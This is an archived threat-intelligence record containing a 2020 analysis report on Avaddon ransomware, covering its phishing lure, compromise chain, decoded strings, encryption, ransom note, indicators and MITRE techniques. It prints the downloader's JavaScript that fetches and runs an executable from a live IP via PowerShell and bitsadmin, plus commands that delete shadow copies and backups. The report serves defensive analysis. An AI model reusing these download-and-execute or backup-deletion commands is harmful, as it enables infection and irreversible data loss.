{
    "id": "1b083e9b-8d18-4cb8-b5b0-96fe065b04bd",
    "created_at": "2022-10-25T16:48:10.408786Z",
    "updated_at": "2025-03-27T02:05:37.910157Z",
    "deleted_at": null,
    "sha1_hash": "80d5c529cf8b2e6274e7e4d9a270f21ec5d7fe65",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-06-22T15:37:35Z",
    "file_modification_date": "2020-06-22T15:37:35Z",
    "file_size": 1132631,
    "plain_text": "# Avaddon Ransomware\n\n## Date: 22/06/2020\n\n Shyava Tripathi\n\n\n-----\n\nPropagating via a massive malspam campaign, the Avaddon ransomware has loomed and is\ntargeting users worldwide. This ransomware is a cryptolocker written in C++ and performs\nencryption using AES256 and RSA2048 standards. Launched at the beginning of this month, this\nransomware is being marketed as a Ransomware-as-a-Service (RaaS) program by its threat\nactors; its advertisements being posted on Russian hacker forums. Moreover, Avaddon's threat\nactors are actively recruiting affiliates to increase the reach of the malware using an affiliate\nrevenue system. Threat actors who sign up as affiliates are responsible for delivering the malware\nin any way possible. The ransomware can be used and distributed by threat actors without an\ninitial fee, but a 35% share of the earned ransom payments goes to Avaddon operators as part of\nthis arrangement. Threat actors responsible for distribution get to keep the remaining 65% share\nof the ransom payment brought in. This makes Avaddon an enticing choice for threat actors who\nwant a no-risk trial for the new malware.\nIn the first known wave of attacks, a JavaScript downloader for the Avaddon ransomware is being\ndistributed in a spam campaign.\n\n### CAMPAIGN ANALYSIS\nThe campaign delivers well-crafted email messages with snappy subjects like, \"Do you like my\nphoto?\" or \"Your new photo?\", which successfully lure recipients into opening them. The phishing\nemails embody nothing but a winking smiley face emoji along with an attached JPG image in a .zip\nformat (IMG<6 Random Digits>.jpg.js.zip). The attachment, as it happens, is a malicious\nJavaScript file concealed as an image to evade detection.\n\n_Figure 1: Phishing Email 1 (Source: BleepingComputer)_\n\n_Figure 2: Phishing Email 2 (Source: Appriver)_\n\n\n-----\n\n_Figure 3: Phishing Email 3 (Source: ESET Research)_\n\nSince extensions are, by default, hidden by Windows, the attachment would just appear as a\nharmless .jpg file to the recipient. This flaw is widely leveraged by threat actors to make files\nappear legitimate. The pattern observed in the sender email addresses is '<name>[0-9]{2}@[0**9]{4}.com'. Since most of the domains are parked domains, blocking on policy grounds is not**\npossible.\nUpon execution of the JavaScript, the Avaddon ransomware is downloaded and launched using\nPowerShell and BitsAdmin tool, and files on the computer are subsequently encrypted.\n\n### COMPROMISE CHAIN\n\n The figure below illustrates the typical compromise chain in an Avaddon campaign: \n\n_Figure 4: Avaddon Compromise Chain_\n\n### THE MALICIOUS JAVASCRIPT\n\nThe JavaScript attached to these emails masquerades as a JPG photo with names like\nIMG123101.jpg and IMG148150.jpg. Upon execution, the ~ 4 KB JavaScript launches PowerShell\nwith the execution policy bypass flag so that the script is run without any warnings or prompts.\nThe PowerShell command downloads an executable (jpr.exe/sava.exe) from the IP address\n'217.8.117.63' into the temp folder and saves it as <Random Digits>.exe before it is executed.\n\nDespite differences in certain aspects such as the name of the files downloaded from the server\nand the names these files are saved as, the basic template containing the PowerShell command to\ndownload and execute the ransomware remains the same in the observed samples.\n\n\n-----\n\n### var jsRun=new ActiveXObject('WSCRIPT.Shell'); jsRun.Run(\"cmd.exe /c PowerShell -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://217.8.117.63/<name>.exe','%temp%\\\\[0- 9]{7}{8}{9}.exe');Start-Process '%temp%\\\\[0-9]{7}{8}{9}.exe '\",false); jsRun.Run(\"cmd.exe /c bitsadmin /transfer getitman /download /priority high http://217.8.117.63/<name>.exe %temp%\\\\[0-9]{7}{8}{9}.exe&start %temp%\\\\[0- 9]{7}{8}{9}.exe \", false);\n\n\n### AVADDON OVERVIEW \n\n Avaddon deploys multiple anti-debug techniques to evade detection, one of them being the detection of a debug environment. If a debugger is detected, the main execution flow is bypassed and the malware terminates itself.\n\n As is typical with RaaS programs, the threat actors behind Avaddon forbid targeting victims in the Commonwealth of Independent States (CIS). The malware uses the ‘GetUserDefaultLCID’ and ‘GetKeyboardLayout’ functions to obtain the language identifiers as a string. The acquired string is then matched with hex values of Russian (419h) and Ukrainian (422h) language codes since the malware does not intend to infect systems with these keyboards. If any of them is matched, the malware bypasses the main execution and jumps to termination.\n\n_Figure 5: Avaddon detecting user languages_\n\n\n-----\n\n### The analysed Avaddon ransomware samples are not packed, although, some of the extracted strings appear to be encoded in Base64 using a custom computation. The decryption routine applies the 'SUB' operation with '2' followed by the 'XOR' operation with '43h' to decrypt these strings.\n\n_Figure 6: Decryption Routine for Base64 Encoded Strings_\n\n### Upon decryption, the following 47 plaintext strings are retrieved:\n\n\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\nEnableLinkedConnections\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\nEnableLUA\nConsentPromptBehaviorAdmin\nSYSTEMDRIVE\nPROGRAMFILES(x86)\nUSERPROFILE\nProgramData\nProgram Files\nALLUSERSPROFILE\nAppData\nPUBLIC\nTor Browser\nWindows\n\\Windows\n\\Program Files\n\\Users\\All Users\n\\AppData\nwmic.exe SHADOWCOPY /nointeractive\nwbadmin DELETE SYSTEMSTATEBACKUP\nwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest\nbcdedit.exe /set {default} recoveryenabled No\n\n\n-----\n\nElevation:Administrator!new:\n{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\n{6EDD6D74-C007-4E75-B76A-E5740995E24C}\npowershell.exe\n-readme.html\nbckgrd.bmp\nAll your files has been encrypted\nInstruction\nHOMEDRIVE\nHOMEPATH\nControl Panel\\Desktop\nWallPaper\n{{id}}\nupdate\n{2A0E9C7B-6BE8-4306-9F73-1057003F605B}\n\\Program Files\\Microsoft\\Exchange Server\n\\Program Files (x86)\\Microsoft\\Exchange Server\n\\Program Files\\Microsoft SQL Server\n\\Program Files (x86)\\Microsoft SQL Server\nWinInet\nHTTP/1.1\napi.myip.com\n\n\n### For encryption, the ransomware uses Windows crypto API function 'CryptGenKey' to generate an AES key (symmetric), with which it then encrypts the local data present on the infected machine. The generated AES key is further exported with 'CryptExportKey' and encrypted with the help of an imported RSA public key using the 'CryptEncrypt' function. \n\n_Figure 7: Key Generation & Encryption Routine_\n\n\n-----\n\n### Once executed, the ransomware copies itself to ‘%APPDATA/Roaming%’ folder and looks for data to encrypt followed by appending the .avdn extension to encrypted files. The malware also tries to access and encrypt the data present in the connected physical and logical drives. This is done by updating the disk attribute properties (IOCTL_DISK_UPDATE_PROPERTIES) so that these drives are accessible by the malware.\n\n The ransomware also creates a file containing the ransom note in every directory it encrypts, named [0-9]+-readme.html. The ransom message directs the users to a TOR payment site on the darknet and further decryption information. Upon accessing the darknet site, victims are needed to input a unique encryption ID found inside the readme file. The ransom amount to be paid along with a countdown timer are displayed once the unique encryption key is entered.\n\n We were given 16 days and 16 hours in our test environment to pay the $300 USD ransom demand via bitcoin before the ransom gets doubled (ransom amount may vary from sample to sample).\n\n_Figure 8: Onion Link for ransom payment_\n\n### The ransomware uses Windows Management Instrumentation Command-line (wmic.exe) to\ndelete shadow copies in a non-interactive mode and wbadmin to delete the system backup so that\nthe original user files cannot be recovered without paying ransom.\n\n\n-----\n\n### The commands to delete volume shadow copies and system backup were obtained on decoding the base64 strings present in the sample.\n\n\nwmic.exe SHADOWCOPY /nointeractive\nwbadmin DELETE SYSTEMSTATEBACKUP\nwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest\nbcdedit.exe /set {default} recoveryenabled No\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nvssadmin.exe Delete Shadows /All /Quiet\n\n\n### SUBEXSECURE PROTECTION\n\n SubexSecure detects the Avaddon downloader JavaScript as ‘SS_Gen_Avaddon_JS_Downloader_A’ and Avaddon Ransomware as ‘SS_Gen_Avaddon_Ransomware_A’. \n\n README FILE:\n\n```\nYour network has been infected by Avaddon\nAll your documents, photos, databases and other important files have\nbeen encrypted and you are not able to decrypt it by yourself. But\ndon't worry, we can help you to restore all your files!\nThe only way to restore your files is to buy our special software Avaddon General Decryptor. Only we can give you this software and only\nwe can restore your files!\nYou can get more information on our page, which is located in a Tor\nhidden network.\nHow to get to our page\nDownload Tor browser - https://www.torproject.org/\nInstall Tor browser\nOpen link in Tor browser - avaddonbotrxmuyl.onion\nFollow the instructions on this page\nYour ID:\nXXX\nDO NOT TRY TO RECOVER FILES YOURSELF!\nDO NOT MODIFY ENCRYPTED FILES!\nOTHERWISE, YOU MAY LOSE ALL YOUR FILES FOREVER!\n\n```\n\n-----\n\n### IOC:\n\n Javascript 12bc439445f10a04b574d49ed8ccc405e2dfaa493747585439643e8a2129e5e5 Downloader cc4d665c468bcb850baf9baab764bb58e8b0ddcb8a8274b6335db5af86af72fb\n\n94faa76502bb4342ed7cc3207b3158027807a01575436e2b683d4816842ed65d\nb8d6fd333973adb640649cab8c9e7575a17b5a8bc382e3335400d43a606a6253\n5a47a89a870d7db244c76da43887e33c9ee4b26f9972878b1a6616be0302439f\na481d2b64c546f68d55e1fd23e57ada80b6b4e2c3dd7b0466380dba465f3d318\nc06e2e3fe09f92007ff589e46a57cb8efa1fe261d7b8193190eb648cf7961a4b\n\n### Avaddon d1c1dfa0117fc595419464578959feb4c459ab99a498e0cb66cee626ceff6835 Ransomware f3f4d4e4c6704788bc8954ca6f6ddc61b006aba89d5d384794f19424a3d24132\n\n6616abb725c24307f4f062996edc5150079bc477acd4236a4f450e5835a20c62\n05af0cf40590aef24b28fa04c6b4998b7ab3b7f26e60c507adb84f3d837778f2\ndccc689c986e357d5dbdc987e72e6b8a0e9017cbf347449b27c84b8b7b9d507a\n\n### MITRE ATTACK TECHNIQUES\n\n|IOC:|Col2|\n|---|---|\n|Javascript Downloader|12bc439445f10a04b574d49ed8ccc405e2dfaa493747585439643e8a2129e5e5|\n||cc4d665c468bcb850baf9baab764bb58e8b0ddcb8a8274b6335db5af86af72fb|\n||94faa76502bb4342ed7cc3207b3158027807a01575436e2b683d4816842ed65d|\n||b8d6fd333973adb640649cab8c9e7575a17b5a8bc382e3335400d43a606a6253|\n||5a47a89a870d7db244c76da43887e33c9ee4b26f9972878b1a6616be0302439f|\n||a481d2b64c546f68d55e1fd23e57ada80b6b4e2c3dd7b0466380dba465f3d318|\n||c06e2e3fe09f92007ff589e46a57cb8efa1fe261d7b8193190eb648cf7961a4b|\n\n|Avaddon Ransomware|d1c1dfa0117fc595419464578959feb4c459ab99a498e0cb66cee626ceff6835|\n|---|---|\n||f3f4d4e4c6704788bc8954ca6f6ddc61b006aba89d5d384794f19424a3d24132|\n||6616abb725c24307f4f062996edc5150079bc477acd4236a4f450e5835a20c62|\n||05af0cf40590aef24b28fa04c6b4998b7ab3b7f26e60c507adb84f3d837778f2|\n||dccc689c986e357d5dbdc987e72e6b8a0e9017cbf347449b27c84b8b7b9d507a|\n\n|TACTIC|ID|NAME|DESCRIPTION|\n|---|---|---|---|\n|Initial Access|T1193|Spearphishing Attachment|Avaddon has been delivered by phishing emails containing malicious javascripts disguised as images.|\n|Execution|T1035|Service Execution|Avaddon creates Windows services (wmic, wbadmin, vssadmin, bccdedit) using ‘OpenSCManager’ during execution.|\n|Execution|T1047|Windows Management Instrumentation|Avaddon employs wmic to delete shadow copies.|\n|Persistence|T1215|Kernel Modules and Extensions|Avaddon spawns threads (wmic, wbadmin, vssadmin) which access the Kernel Security Device Driver, KsecDD.|\n|Persistence|T1060|Registry Run Keys / Startup Folder|Avaddon adds Registry Run keys (Value: %APPDATA%\\Filename) to achieve persistence.|\n|Persistence|T1179|Hooking|Avaddon hooks several API functions to spawn system threads.|\n|Privilege Escalation|T1055|Process Injection|Avaddon writes data to wbadmin, bcdedit and|\n\n\n-----\n\n|Col1|Col2|Col3|vssadmin processes to delete system backup and shadow copies.|\n|---|---|---|---|\n|Defense Evasion|T1107|File Deletion|Avaddon deletes shadow copies, system state backup and volume snapshots to prevent data recovery.|\n|Defense Evasion|T1112|Modify Registry|Avaddon has used Registry modifications (Modifies system certificate, proxy and browser settings) as part of its installation routine.|\n|Discovery|T1083|File and Directory Discovery|Avaddon searches for user files by file extension before encryption.|\n|Discovery|T1012|Query Registry|Avaddon queries the registry for obtaining MachineGUID, browser settings, windows trust settings supported languages.|\n|Discovery|T1497|Virtualization/Sandbox Evasion|Avaddon employs anti debug techniques such as detecting a debug environment to evade detection.|\n|Discovery|T1016|System Network Configuration Discovery|Avaddon will attempt to determine the local network segment it is a part of.|\n|Discovery|T1120|Peripheral Device Discovery|Avaddon contains a thread that will attempt to query volume information to encrypt files on attached devices.|\n|Command and Control|T1043|Commonly Used Port|Avaddon uses HTTP over port 443 for communication.|\n|Impact|T1486|Data Encrypted for Impact|Avaddon encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.|\n\n\n-----\n\n|Impact|T1490|Inhibit System Recovery|Avaddon uses wmic, bcdedit, vssadmin and wbadmin to delete and disable operating system recovery features such as shadow copies, prefetch files and system backup.|\n|---|---|---|---|\n\n\n### OUR HONEYPOT NETWORK\n\n This report has been prepared from threat intelligence gathered by our honeypot network that is today operational in 62 cities across the world. These cities have at least one of these attributes: \n\n ▪ Are landing centers for submarine cables \n ▪ Are internet traffic hotspots\n ▪ House multiple IoT projects with a high number of connected endpoints \n ▪ House multiple connected critical infrastructure projects \n ▪ Have academic and research centers focusing on IoT \n ▪ Have the potential to host multiple IoT projects across domains in the future\n\n Over 3.5 million attacks a day registered across this network of individual honeypots are studied, analyzed, categorized and marked according to a threat rank index, a priority assessment framework, that we have developed within Subex. The network includes over 4000 physical and virtual devices covering over 400 device architectures and varied connectivity flavors globally. Devices are grouped based on the sectors they belong to for purposes of understanding sectoral attacks. Thus, a layered flow of threat intelligence is made possible.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        }
    ],
    "references": [
        "https://www.subexsecure.com/pdf/malware-reports/June-2020/Avaddon_Ransomware.pdf"
    ],
    "report_names": [
        "Avaddon_Ransomware.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041137,
    "ts_creation_date": 1592840255,
    "ts_modification_date": 1592840255,
    "files": {
        "pdf": "https://archive.orkl.eu/80d5c529cf8b2e6274e7e4d9a270f21ec5d7fe65.pdf",
        "text": "https://archive.orkl.eu/80d5c529cf8b2e6274e7e4d9a270f21ec5d7fe65.txt",
        "img": "https://archive.orkl.eu/80d5c529cf8b2e6274e7e4d9a270f21ec5d7fe65.jpg"
    }
}